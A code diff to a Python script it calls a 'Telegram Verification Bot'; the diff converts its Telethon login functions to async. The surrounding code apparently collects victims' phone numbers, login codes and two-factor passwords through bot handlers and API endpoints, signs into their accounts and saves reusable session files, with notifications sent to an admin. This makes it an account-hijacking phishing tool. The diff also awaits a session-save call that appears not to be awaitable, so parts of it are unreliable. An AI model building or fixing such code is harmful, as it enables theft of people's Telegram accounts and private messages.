@@ -7,8 +7,9 @@ import time
 import logging
 import json
 from datetime import datetime
+import asyncio
 import traceback
-from telethon.sync import TelegramClient
+from telethon import TelegramClient
 from telethon.errors import (
     FloodWaitError, PhoneCodeInvalidError, 
     SessionPasswordNeededError, PasswordHashInvalidError
@@ -136,9 +137,9 @@ def send_error_to_admin(phone, error_message, user_id=None, error_details=None):
     except Exception as e:
         logger.error(f"Error sending to admin: {e}")
 
-# ==================== TELETHON FUNCTIONS ====================
-def run_telethon_send_otp(phone):
-    """Send OTP using Telethon"""
+# ==================== TELETHON FUNCTIONS (ASYNC) ====================
+async def send_otp_async(phone):
+    """Send OTP using Telethon (async)"""
     try:
         # Create session directory
         os.makedirs('sessions', exist_ok=True)
@@ -151,13 +152,13 @@ def run_telethon_send_otp(phone):
         client = TelegramClient(session_name, API_ID, API_HASH)
         
         # Connect and send code request
-        client.connect()
+        await client.connect()
         
         if not client.is_connected():
             return {'success': False, 'error': 'Failed to connect to Telegram'}
         
         try:
-            sent = client.send_code_request(phone)
+            sent = await client.send_code_request(phone)
             
             return {
                 'success': True,
@@ -171,7 +172,7 @@ def run_telethon_send_otp(phone):
             return {'success': False, 'error': str(e)}
         finally:
             try:
-                client.disconnect()
+                await client.disconnect()
             except:
                 pass
             
@@ -179,8 +180,8 @@ def run_telethon_send_otp(phone):
         logger.error(f"Telethon send OTP error: {e}")
         return {'success': False, 'error': f'Connection failed: {str(e)}'}
 
-def run_telethon_verify_otp(phone, otp, phone_code_hash):
-    """Verify OTP using Telethon"""
+async def verify_otp_async(phone, otp, phone_code_hash):
+    """Verify OTP using Telethon (async)"""
     try:
         phone_clean = phone.replace('+', '')
         session_name = f"sessions/{phone_clean}"
@@ -191,21 +192,21 @@ def run_telethon_verify_otp(phone, otp, phone_code_hash):
         
         # Initialize Telegram client
         client = TelegramClient(session_name, API_ID, API_HASH)
-        client.connect()
+        await client.connect()
         
         if not client.is_connected():
             return {'success': False, 'error': 'Failed to connect to Telegram'}
         
         try:
             # Sign in with OTP
-            client.sign_in(
+            await client.sign_in(
                 phone=phone,
                 code=otp,
                 phone_code_hash=phone_code_hash
             )
             
             # Get user info
-            me = client.get_me()
+            me = await client.get_me()
             user_info = {
                 'id': me.id,
                 'username': me.username,
@@ -215,7 +216,7 @@ def run_telethon_verify_otp(phone, otp, phone_code_hash):
             }
             
             # Save session
-            client.session.save()
+            await client.session.save()
             session_path = f"{client.session.filename}.session"
             
             return {
@@ -238,7 +239,7 @@ def run_telethon_verify_otp(phone, otp, phone_code_hash):
             return {'success': False, 'error': str(e)}
         finally:
             try:
-                client.disconnect()
+                await client.disconnect()
             except:
                 pass
             
@@ -246,8 +247,8 @@ def run_telethon_verify_otp(phone, otp, phone_code_hash):
         logger.error(f"Telethon verify OTP error: {e}")
         return {'success': False, 'error': str(e)}
 
-def run_telethon_verify_2fa(session_name, password):
-    """Verify 2FA password using Telethon"""
+async def verify_2fa_async(session_name, password):
+    """Verify 2FA password using Telethon (async)"""
     try:
         # Check if session exists
         if not os.path.exists(session_name + '.session'):
@@ -255,16 +256,16 @@ def run_telethon_verify_2fa(session_name, password):
         
         # Initialize Telegram client
         client = TelegramClient(session_name, API_ID, API_HASH)
-        client.connect()
+        await client.connect()
         
         if not client.is_connected():
             return {'success': False, 'error': 'Failed to connect to Telegram'}
         
         try:
-            client.sign_in(password=password)
+            await client.sign_in(password=password)
             
             # Get user info
-            me = client.get_me()
+            me = await client.get_me()
             user_info = {
                 'id': me.id,
                 'username': me.username,
@@ -274,7 +275,7 @@ def run_telethon_verify_2fa(session_name, password):
             }
             
             # Save session
-            client.session.save()
+            await client.session.save()
             session_path = f"{client.session.filename}.session"
             
             return {
@@ -289,12 +290,25 @@ def run_telethon_verify_2fa(session_name, password):
             return {'success': False, 'error': str(e)}
         finally:
             try:
-                client.disconnect()
+                await client.disconnect()
             except:
                 pass
             
     except Exception as e:
         logger.error(f"Telethon verify 2FA error: {e}")
+        return {'success': False, 'error': str(e)}
+
+def run_async_task(coroutine):
+    """Run async task in thread with proper event loop"""
+    try:
+        # Create new event loop for this thread
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(coroutine)
+        loop.close()
+        return result
+    except Exception as e:
+        logger.error(f"Async task error: {e}")
         return {'success': False, 'error': str(e)}
 
 # ==================== BOT HANDLERS ====================
@@ -383,10 +397,10 @@ def handle_contact(message):
             parse_mode='HTML'
         )
         
-        # Send OTP in background
+        # Send OTP in background with proper async handling
         def send_otp_task():
             try:
-                result = run_telethon_send_otp(phone)
+                result = run_async_task(send_otp_async(phone))
                 
                 if result.get('success'):
                     # Store OTP data
@@ -518,9 +532,9 @@ def api_share_contact():
             'time': time.time()
         }
         
-        # Send OTP in background
+        # Send OTP in background with proper async handling
         def send_otp_task():
-            result = run_telethon_send_otp(phone)
+            result = run_async_task(send_otp_async(phone))
             
             if result.get('success'):
                 otp_data[user_id] = {
@@ -594,7 +608,7 @@ def api_verify_otp():
             return jsonify({'success': False, 'error': 'OTP not sent yet'})
         
         # Verify OTP using Telethon
-        result = run_telethon_verify_otp(phone, otp, phone_code_hash)
+        result = run_async_task(verify_otp_async(phone, otp, phone_code_hash))
         
         if result.get('success'):
             if result.get('requires_2fa'):
@@ -679,7 +693,7 @@ def api_verify_2fa():
             return jsonify({'success': False, 'error': 'Session expired'})
         
         # Verify 2FA using Telethon
-        result = run_telethon_verify_2fa(session_name, password)
+        result = run_async_task(verify_2fa_async(session_name, password))
         
         if result.get('success'):
             # Success
@@ -780,7 +794,7 @@ def cleanup_old_sessions():
 # ==================== MAIN ====================
 if __name__ == "__main__":
     logger.info("="*60)
-    logger.info("🚀 Telegram Verification Bot - ERROR HANDLING VERSION")
+    logger.info("🚀 Telegram Verification Bot - FINAL FIXED VERSION")
     logger.info("="*60)
     logger.info(f"🤖 Main Bot Token: {BOT_TOKEN[:10]}...")
     logger.info(f"👑 Admin Bot Token: {ADMIN_BOT_TOKEN[:10]}..." if ADMIN_BOT_TOKEN else "👑 Using main bot for admin notifications")
